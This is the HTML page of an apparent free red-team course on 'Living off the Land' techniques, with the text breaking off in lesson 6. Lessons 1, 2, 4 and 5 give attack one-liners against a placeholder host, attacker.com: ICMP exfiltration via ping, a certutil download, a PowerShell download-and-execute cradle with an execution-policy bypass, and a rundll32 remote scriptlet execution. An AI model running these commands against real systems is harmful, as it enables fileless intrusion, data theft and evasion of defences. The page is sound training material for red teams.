



<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css"
    />
    <link rel="stylesheet" href="assets/css/coursepages.css">

   <!-- ========== HEAD – COPY/PASTE AS-IS ========== -->
<title>Living off the Land Course | Free Red-Team Training – CipherHall</title>
<meta name="description" content="Master 30 LOLBAS & GTFOBins techniques in 50 h of hands-on labs. No malware, no uploads – just native Windows, Linux & cloud tools. Enrol free.">
<link rel="canonical" href="https://www.cipherhall.com/courses/living-off-the-land-detail.html">

<!-- Open-Graph / Twitter -->
<meta property="og:title" content="Living off the Land Course | Free Red-Team Training – CipherHall">
<meta property="og:description" content="50-hour practical course on LOLBAS, GTFOBins & cloud CLI abuse. Graduate from script-kiddie to stealth-red-team operator.">
<meta property="og:type" content="website">
<meta property="og:url" content="https://www.cipherhall.com/courses/living-off-the-land-detail.html">
<!-- JSON-LD Course Schema -->
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Course",
  "name": "Living off the Land: Adversary Simulation",
  "description": "Doctoral-level red-team course covering 30 native Windows, Linux & cloud LOLBAS/GTFOBins techniques, 50 h of labs, 100 % free.",
  "provider": {
    "@type": "Organization",
    "name": "CipherHall",
    "url": "https://www.cipherhall.com",
    "logo": "https://www.cipherhall.com/favicon.png"
  },
  "hasCourseInstance": {
    "@type": "CourseInstance",
    "courseMode": "online",
    "instructor": {
      "@type": "Person",
      "name": "Dr. Alex Chen"
    },
    "coursePrerequisites": "Basic Windows & Linux CLI, Active Directory fundamentals",
    "educationalCredentialAwarded": "Certificate of Completion",
    "timeRequired": "P2D",          // ISO 8601 duration ≈ 50 h
    "isAccessibleForFree": true,
    "price": "0",
    "priceCurrency": "USD"
  }
}
</script>

    <link rel="stylesheet" href="assets/css/coursepages.css">
  </head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CipherHall</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CipherHall</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard.html" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================

      const COURSE_DATA = 

{
    "id": "living-off-the-land-course",
    "title": "Living off the Land: A Course in Adversary Simulation",
    "description": "A comprehensive 30-lesson course on using a system's own built-in tools and features to achieve offensive security objectives, minimizing footprints and evading detection.",
    "category": "cybersecurity-offensive",
    "difficulty": "Advanced",
    "duration": "50 hours",
    "instructor": "Dr. Alex Chen",
    "lessons": [
        {
            "id": "lesson-1",
            "title": "Introduction to Living off the Land (LotL)",
            "duration": "60 min",
            "objectives": [
                "Define the 'Living off the Land' philosophy",
                "Differentiate LotL attacks from traditional malware-based attacks",
                "Understand the key benefits: stealth and bypassing application whitelisting",
                "Analyze the dual-use nature of legitimate system tools"
            ],
            "content": {
                "overview": "This foundational lesson introduces the 'Living off the Land' (LotL) philosophy. We will explore why modern attackers and red teams have shifted away from custom malware towards using a target's own built-in tools to achieve their objectives, making their activity incredibly difficult to distinguish from legitimate administrative work.",
                "sections": [
                    {
                        "title": "Defining the LotL Philosophy",
                        "content": "<p><strong>Living off the Land</strong> is the practice of using an operating system's own native, pre-installed tools and features to conduct a cyberattack. Instead of bringing their own custom malware and hacking tools, attackers use the legitimate tools already present on the system, such as PowerShell, WMI, or certutil.</p><p>The core idea is to hide in plain sight. By using trusted, signed binaries, an attacker's activity can blend in with the noise of normal administrative tasks, making detection a significant challenge for defenders.</p>",
                        "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Key Benefits for an Attacker",
                        "content": "<p>Adopting a LotL approach provides several major advantages:</p><ul><li><strong>Stealth:</strong> Using `powershell.exe` to download a file is far less suspicious to a security product than a custom, unknown binary named `downloader.exe`. The attacker's actions are hidden among legitimate administrative activity.</li><li><strong>Bypassing Application Whitelisting:</strong> Application whitelisting is a powerful defense that only allows known, trusted executables to run. LotL techniques bypass this control by design, as the attacker is only using executables that are already on the whitelist (e.g., legitimate Microsoft-signed binaries).</li><li><strong>Reduced Attribution:</strong> Because the attacker is not using their own custom malware, it is much harder for forensic investigators to attribute the attack to a specific threat actor.</li></ul>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Dual-Use Example: ping.exe",
                        "language": "bash",
                        "code": "# ping.exe is a fundamental networking utility.\n\n# Legitimate Use: Check network connectivity to a server.\nping google.com\n\n# Malicious Use (Conceptual): Data exfiltration via ICMP.\n# An attacker could encode a secret message into the data payload of ICMP packets.\n# To a firewall, this just looks like a lot of ping traffic.\n\n# (This requires a custom listener on the attacker's side to reconstruct the data)\nping -p \"SECRET_DATA_CHUNK_1\" attacker.com\nping -p \"SECRET_DATA_CHUNK_2\" attacker.com"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the core philosophy of 'Living off the Land'?",
                        "options": [
                            "To use custom-built malware for all attacks.",
                            "To use an operating system's own built-in tools and features to conduct an attack.",
                            "To only attack physical infrastructure.",
                            "To always work from a remote location."
                        ],
                        "correct": 1,
                        "explanation": "The LotL philosophy is about using the target's own resources against them, which provides significant advantages in stealth and evasion."
                    },
                    {
                        "id": 2,
                        "question": "What is a primary benefit of using LotL techniques for an attacker?",
                        "options": [
                            "They are easier to use than custom tools.",
                            "They bypass preventive controls like application whitelisting by using already-trusted executables.",
                            "They always work.",
                            "They cannot be detected."
                        ],
                        "correct": 1,
                        "explanation": "Application whitelisting is designed to block untrusted executables. By using trusted, signed system binaries, LotL attacks circumvent this entire layer of defense."
                    },
                    {
                        "id": 3,
                        "question": "The fact that a tool like PowerShell can be used by both a system administrator and an attacker is an example of what concept?",
                        "options": [
                            "A software bug.",
                            "The dual-use nature of administrative tools.",
                            "A firewall misconfiguration.",
                            "A feature, not a bug."
                        ],
                        "correct": 1,
                        "explanation": "Many powerful administrative tools have a dual-use nature. This is the fundamental challenge for defenders: how to distinguish between a legitimate use and a malicious use of the exact same tool."
                    }
                ]
            }
        },
        {
            "id": "lesson-2",
            "title": "The LOLBAS Project and Core Resources",
            "duration": "60 min",
            "objectives": [
                "Get an introduction to the Living Off the Land Binaries and Scripts (LOLBAS) project",
                "Learn how to navigate and use the LOLBAS website",
                "Understand the purpose of GTFOBins for Unix/Linux systems",
                "Use these resources to find an abusable binary for a specific MITRE ATT&CK tactic"
            ],
            "content": {
                "overview": "The number of dual-use binaries and scripts is vast and constantly growing. Fortunately, the security community has created several incredible open-source projects to catalog these techniques. This lesson introduces the essential resources that every adversary simulator uses to find the right LotL tool for the job.",
                "sections": [
                    {
                        "title": "The LOLBAS Project",
                        "content": "<p>The <strong>LOLBAS (Living Off the Land Binaries, Scripts, and Libraries)</strong> project is a community-driven effort to document every Microsoft-signed binary, script, and library that can be abused by an attacker. The project is hosted on GitHub and is an indispensable resource.</p><p>For each binary, the project provides:<ul><li>A description of its legitimate purpose.</li><li>The specific command-line syntax for how it can be abused.</li><li>The MITRE ATT&CK Tactic and Technique it maps to.</li><li>Detection guidance for defenders.</li><li>References to the original research.</li></ul></p>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    },
                    {
                        "title": "GTFOBins for Unix/Linux",
                        "content": "<p><strong>GTFOBins</strong> is a similar project, but focused on the Unix and Linux world. It curates a list of Unix binaries that can be abused to bypass local security restrictions.</p><p>It is primarily focused on privilege escalation. For example, if a low-privilege user is allowed to run a command like `find` with `sudo`, GTFOBins provides the exact command-line syntax to abuse its `-exec` parameter to spawn a root shell. It's a critical resource for the Linux privilege escalation phase of an engagement.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "LOLBAS Website Navigation Example",
                        "language": "markdown",
                        "code": "# Scenario: An attacker wants to download a file from the internet.\n# They consult the LOLBAS project to find a suitable binary.\n\n1.  **Go to the LOLBAS website:** https://lolbas-project.github.io/\n2.  **Filter by Tactic:** Click on the 'Command and Control' Tactic.\n3.  **Find the Technique:** Look for the 'Ingress Tool Transfer' (T1105) technique.\n4.  **Discover Binaries:** The site lists several binaries that can perform this action, including:\n    -   `bitsadmin.exe`\n    -   `certutil.exe`\n    -   `powershell.exe`\n5.  **Get the Command:** Clicking on `certutil.exe` reveals the exact command syntax needed to download a file:\n    -   `certutil.exe -urlcache -split -f http://attacker.com/tool.exe C:\\temp\\tool.exe`"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the LOLBAS project?",
                        "options": [
                            "A type of malware.",
                            "A community-curated list of all Microsoft-signed binaries, scripts, and libraries that can be abused by attackers.",
                            "A security product.",
                            "A programming language."
                        ],
                        "correct": 1,
                        "explanation": "LOLBAS is the go-to encyclopedia for Windows LotL techniques. It's an essential resource for both attackers (to find tools) and defenders (to know what to monitor)."
                    },
                    {
                        "id": 2,
                        "question": "GTFOBins is a resource that primarily focuses on which operating system and tactic?",
                        "options": [
                            "Windows and Lateral Movement",
                            "macOS and Execution",
                            "Linux/Unix and Privilege Escalation",
                            "Windows and Persistence"
                        ],
                        "correct": 2,
                        "explanation": "GTFOBins is the Linux equivalent of LOLBAS, with a strong focus on how to abuse SUID binaries or misconfigured sudo permissions to escalate to root."
                    },
                    {
                        "id": 3,
                        "question": "How do these projects help a red team operator?",
                        "options": [
                            "They provide a searchable, curated database of techniques, saving the operator from having to discover all these tricks themselves.",
                            "They automatically execute the attacks.",
                            "They write the final report.",
                            "They do not help a red team operator."
                        ],
                        "correct": 0,
                        "explanation": "These resources are a massive time-saver and knowledge base. They allow an operator to quickly find the right 'tool' for the job based on the specific tactic they are trying to achieve."
                    }
                ]
            }
        },
        {
            "id": "lesson-3",
            "title": "Core Windows Command-Line Tools for Reconnaissance",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of situational awareness after a compromise",
                "Learn how to use built-in Windows commands for host enumeration",
                "Explore commands for gathering user, network, and process information",
                "Practice using these commands to perform initial reconnaissance in a lab"
            ],
            "content": {
                "overview": "Once an attacker has a shell on a host, their first step is not to cause damage, but to gather information. This lesson covers the crucial phase of host-based reconnaissance or 'situational awareness', focusing on how an attacker uses the system's own built-in Windows command-line tools to understand the compromised machine and its place in the network.",
                "sections": [
                    {
                        "title": "Situational Awareness",
                        "content": "<p>The attacker needs to answer several key questions before they can proceed:</p><ul><li><strong>Who am I?</strong> (<code>whoami</code>, <code>hostname</code>): What user account have I compromised? What is the name of this computer?</li><li><strong>What is this machine?</strong> (<code>systeminfo</code>): Is it a Windows 10 workstation or a Windows Server 2019? Is it part of a domain?</li><li><strong>What is running on it?</strong> (<code>tasklist</code>, <code>sc query</code>): What processes and services are running? Are there any security tools (EDR) that I need to be aware of?</li><li><strong>What are the network connections?</strong> (<code>netstat</code>, <code>ipconfig</code>): What is the machine's IP address? What other internal systems is it connected to?</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Enumerating the Domain",
                        "content": "<p>If the machine is part of an Active Directory domain, the attacker can use the powerful `net` command suite to start mapping the environment, all without needing any special tools.</p><h3>The `net` command:</h3><ul><li><code>net user /domain</code>: Lists all users in the domain.</li><li><code>net group \"Domain Admins\" /domain</code>: Lists all members of the Domain Admins group.</li><li><code>net view /domain</code>: Lists all the computers in the domain.</li></ul><p>This information is invaluable for planning the next steps of privilege escalation and lateral movement.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Initial Host Reconnaissance Commands",
                        "language": "batch",
                        "code": ":: Get current user and group information\nwhoami /all\n\n:: Get the hostname of the computer\nhostname\n\n:: Get OS version and domain information\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Domain\"\n\n:: List all running processes with details\ntasklist /v\n\n:: View all active TCP connections and the process ID for each\nnetstat -ano | findstr ESTABLISHED\n\n:: Query the state of all running services\nsc query state= all"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of the 'situational awareness' phase?",
                        "options": [
                            "To deploy ransomware.",
                            "For the attacker to gather information about the compromised host and its environment to plan their next steps.",
                            "To delete log files.",
                            "To establish persistence."
                        ],
                        "correct": 1,
                        "explanation": "Before an attacker can move laterally or escalate privileges, they must first understand where they are, who they are, and what defenses are in place. This is a crucial intelligence-gathering step."
                    },
                    {
                        "id": 2,
                        "question": "Which command would an attacker use to find out the names of other computers in the domain?",
                        "options": [
                            "ipconfig",
                            "hostname",
                            "net view /domain",
                            "tasklist"
                        ],
                        "correct": 2,
                        "explanation": "The `net view` command is a built-in tool that can query the domain for a list of other hosts, which is a key piece of information for planning lateral movement."
                    },
                    {
                        "id": 3,
                        "question": "The command `netstat -ano` is used by an attacker to find what information?",
                        "options": [
                            "The user's password.",
                            "The list of running processes.",
                            "The active network connections on the host and which process is responsible for them.",
                            "The operating system version."
                        ],
                        "correct": 2,
                        "explanation": "`netstat` is a standard networking utility. The `-ano` flags show all active TCP and UDP connections, the ports they are listening on, and the process ID (PID) associated with each connection. This is a goldmine for understanding the host's role in the network."
                    }
                ]
            }
        },
        {
            "id": "lesson-4",
            "title": "Core PowerShell Concepts for LotL",
            "duration": "75 min",
            "objectives": [
                "Understand why PowerShell is a primary LotL tool for attackers",
                "Learn about PowerShell execution policies and how to bypass them",
                "Explore the concept of in-memory execution to avoid writing to disk",
                "Practice using PowerShell one-liners to download and execute scripts"
            ],
            "content": {
                "overview": "PowerShell is arguably the most powerful and versatile 'Living off the Land' tool available on Windows. It is a full-featured command-line shell and scripting language that is installed by default on all modern Windows systems. This lesson covers the core concepts that make PowerShell the tool of choice for adversaries.",
                "sections": [
                    {
                        "title": "Why PowerShell?",
                        "content": "<p>PowerShell is a red teamer's dream because it is:</p><ul><li><strong>Installed by Default:</strong> It's on every modern Windows machine. No need to bring a custom tool.</li><li><strong>Extremely Powerful:</strong> It can interact with virtually every part of the Windows operating system, from the file system and registry to .NET and WMI.</li><li><strong>In-Memory Execution:</strong> PowerShell makes it trivial to download and execute code directly in memory, without ever writing a file to the disk. This is a powerful technique for evading static AV.</li><li><strong>Trusted:</strong> It is a legitimate, signed Microsoft binary, so it is allowed to run by application whitelisting solutions.</li></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Execution Policies",
                        "content": "<p>PowerShell has a security feature called the <strong>Execution Policy</strong> that is designed to prevent users from accidentally running malicious scripts. By default, on client versions of Windows, this policy is set to 'Restricted', which means no scripts can be run.</p><p>However, this is not a strong security boundary. It can be easily bypassed from the command line using the `-ExecutionPolicy Bypass` flag. This tells the current PowerShell session to ignore the policy, allowing an attacker's one-liner to run.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "In-Memory Execution and One-Liners",
                        "content": "<p>The most common way attackers use PowerShell is with a compressed and encoded one-liner. The `IEX` (Invoke-Expression) cmdlet is used to execute a string as a command.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>The Fileless Download Cradle</strong></div><p>A classic PowerShell one-liner is the 'download cradle'. The attacker uses the `Net.WebClient` object to download their main script from a remote server as a string. This string is then passed directly to `IEX` to be executed. The malicious script never touches the disk, making it a 'fileless' attack that is very effective at bypassing simple AV.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')\"",
                    "language": "powershell",
                    "code": "# This is the classic PowerShell one-liner for fileless execution.\n\n# powershell.exe: The legitimate PowerShell binary.\n# -ExecutionPolicy Bypass: A flag to bypass the local script execution policy.\n# -Command \"...\": The command to execute.\n\n# Inside the command:\n# IEX (Invoke-Expression): A PowerShell cmdlet that executes a string as code.\n# (New-Object Net.WebClient).DownloadString(...): This is the core. It downloads the content\n# of 'script.ps1' from the attacker's server directly into memory as a string.\n\n# For even more stealth, the command is often Base64 encoded and run with the -e flag:\n# powershell.exe -e <Base64_Encoded_Command>"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is a primary reason that attackers love to use PowerShell?",
                        "options": [
                            "It is a third-party tool that they have to upload.",
                            "It is installed by default on all modern Windows systems and is trusted by application whitelisting.",
                            "It is not very powerful.",
                            "It can only be used to manage Active Directory."
                        ],
                        "correct": 1,
                        "explanation": "PowerShell is the ultimate LotL tool. It's powerful, it's always there, and it's trusted, making it the perfect vehicle for an attacker's post-exploitation activities."
                    },
                    {
                        "id": 2,
                        "question": "What is the purpose of the `-ExecutionPolicy Bypass` flag?",
                        "options": [
                            "To make the script run faster.",
                            "To tell the PowerShell session to ignore the system's script execution policy, allowing the attacker's script to run.",
                            "To encrypt the script.",
                            "To run the script as an administrator."
                        ],
                        "correct": 1,
                        "explanation": "The Execution Policy is designed as a safety feature, not a security boundary. This flag provides a trivial, built-in way to circumvent it."
                    },
                    {
                        "id": 3,
                        "question": "What does the `IEX (New-Object Net.WebClient).DownloadString(...)` construct allow an attacker to do?",
                        "options": [
                            "Upload a file.",
                            "Delete a file.",
                            "Download and execute a PowerShell script directly in memory, without writing it to disk.",
                            "List all running processes."
                        ],
                        "correct": 2,
                        "explanation": "This is the classic 'download cradle'. It's a powerful technique for fileless execution that is a hallmark of PowerShell-based attacks."
                    }
                ]
            }
        },
        {
            "id": "lesson-5",
            "title": "Code Execution with rundll32.exe",
            "duration": "60 min",
            "objectives": [
                "Understand the legitimate purpose of rundll32.exe",
                "Learn how it can be abused to load and execute malicious code from DLLs",
                "Explore how to use it to execute remote COM scriptlets",
                "Practice using rundll32 for a simple application whitelisting bypass"
            ],
            "content": {
                "overview": "`rundll32.exe` is a core Windows binary whose legitimate purpose is to load and execute code from Dynamic Link Libraries (DLLs). Because it is a trusted, signed Microsoft binary, attackers frequently abuse it to execute their own malicious code and bypass application whitelisting.",
                "sections": [
                    {
                        "title": "Abusing rundll32.exe",
                        "content": "<p>The `rundll32.exe` program takes the name of a DLL and the name of a function within that DLL as arguments, and then executes that function. An attacker can create a malicious DLL and use `rundll32` to run it.</p><p>More powerfully, it can be used to execute JavaScript or VBScript. An attacker can call a specific function in a system DLL like `mshtml.dll` and pass it a reference to a remote script. This provides another powerful vector for fileless, remote code execution that is proxied through a legitimate system binary.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Executing Remote COM Scriptlets",
                        "content": "<p>One of the most famous LotL techniques involves using `rundll32` to execute a remote COM scriptlet (`.sct` file). The attacker hosts a malicious XML-based scriptlet file on their C2 server. They then use the command line shown below on the victim machine.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>The Bypass Chain</strong></div><p>The `rundll32.exe` process (which is whitelisted) starts. It calls a function in `javascript.dll` which in turn calls `scrobj.dll` (the Script Object Broker). This library then reaches out to the attacker's server over HTTP, downloads the malicious scriptlet, and executes it in memory. The attacker achieves remote code execution without ever writing a `.exe` file to disk, and by only using trusted, built-in Windows components.</p></div>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://attacker.com/payload.sct\")",
                        "language": "batch",
                        "code": ":: This is a complex but powerful one-liner to execute a remote scriptlet.\n\n:: rundll32.exe: The trusted binary.\n:: javascript:\"...\" : The argument, which is a piece of JavaScript code.\n\n:: Inside the JavaScript:\n:: mshtml,RunHTMLApplication: This calls a function in the mshtml library.\n:: GetObject(\"script:https://attacker.com/payload.sct\"): This is the core. It tells the script\n:: engine to fetch and execute a script from the attacker's URL.\n\n:: This is a highly effective, fileless execution technique."
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the legitimate purpose of `rundll32.exe`?",
                        "options": [
                            "To download files from the internet.",
                            "To load and execute a specific function from a DLL file.",
                            "To manage scheduled tasks.",
                            "To edit the registry."
                        ],
                        "correct": 1,
                        "explanation": "`rundll32.exe` is a core OS utility for interacting with Dynamic Link Libraries. Attackers abuse this legitimate functionality."
                    },
                    {
                        "id": 2,
                        "question": "Why is using `rundll32.exe` an effective technique for bypassing application whitelisting?",
                        "options": [
                            "Because it is very fast.",
                            "Because `rundll32.exe` is a trusted, signed Microsoft binary that is almost always allowed to run.",
                            "Because it is a new technique that defenders don't know about.",
                            "Because it encrypts its traffic."
                        ],
                        "correct": 1,
                        "explanation": "This is a classic LotL technique. The whitelisting solution sees the trusted `rundll32.exe` process and allows it, but the attacker is using it as a proxy to execute their own malicious code."
                    },
                    {
                        "id": 3,
                        "question": "What is a COM scriptlet (`.sct` file)?",
                        "options": [
                            "A type of DLL.",
                            "An XML-based file that can contain script code (like JScript or VBScript) that can be executed by the Windows script engine.",
                            "A PowerShell script.",
                            "A configuration file."
                        ],
                        "correct": 1,
                        "explanation": "COM scriptlets are a less common but powerful file format. The ability to fetch and execute them remotely using `rundll32.exe` makes them a favorite tool for attackers."
                    }
                ]
            }
        },
        {
            "id": "lesson-6",
            "title": "Fileless Execution with regsvr32.exe",
            "duration": "60 min",
            "objectives": [
                "Understand the legitimate purpose of regsvr32.exe",
                "Learn how it can be abused to execute remote COM scriptlets",
                "Differentiate its use from rundll32.exe",
                "Practice using regsvr32.exe to bypass application whitelisting"
            ],
            "content": {
                "overview": "Similar to `rundll32.exe`, `regsvr32.exe` is another trusted Windows binary that is intended for a legitimate purpose—registering and un-registering DLLs—but which can be abused for malicious execution. This lesson covers the specifics of using `regsvr32.exe` as another powerful tool in the attacker's LotL arsenal.",
                "sections": [
                    {
                        "title": "Abusing regsvr32.exe",
                        "content": "<p>The primary abuse case for `regsvr32.exe` is almost identical to the one for `rundll32.exe`: executing a remote COM scriptlet. The command-line syntax is slightly different, but the underlying mechanism is the same.</p><p>The attacker hosts a malicious `.sct` file on a web server. They then execute a `regsvr32.exe` command on the victim machine that points to this remote file. The trusted `regsvr32.exe` process will reach out, download the scriptlet, and execute its content in memory. This provides another excellent, fileless method for bypassing application whitelisting.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Why Use It?",
